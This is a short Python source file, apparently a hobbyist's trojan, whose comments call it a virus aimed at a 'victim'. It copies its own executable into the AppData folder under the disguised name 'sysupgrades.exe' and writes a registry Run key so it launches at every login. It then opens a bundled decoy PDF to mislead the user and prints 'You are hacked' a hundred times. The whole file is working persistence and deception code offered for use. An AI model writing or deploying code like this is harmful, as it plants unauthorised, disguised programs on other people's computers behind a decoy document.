import subprocess
import os
import shutil
import sys


def add_to_registry():
    # gives you the system environment, we searched for it's appdata element
    new_file = os.environ["appdata"] + "\\sysupgrades.exe" # <-- our file's name on victim's computer
    # if we haven't already copied the file to their device
    if not os.path.exists(new_file):
        # taking our current exec, copying it to newfile
        shutil.copyfile(sys.executable, new_file)

        # specifying a command to run tht adds our copied virus to the start processes folder
        reg_edit = "reg add HKCU\\Software\\Microsoft\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file

        subprocess.call(reg_edit, shell = True)


def open_added_file():
    added_file = sys._MEIPASS + "\\metallica.pdf"  # name of the pic you want to show
    subprocess.Popen(added_file, shell=True)


add_to_registry()
open_added_file()

x=0
while x < 100:
    print("You are hacked")
    x+=1

# if you compiled the virus with no console option run this (i think? idk)
# my_check = subprocess.check_output("command", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
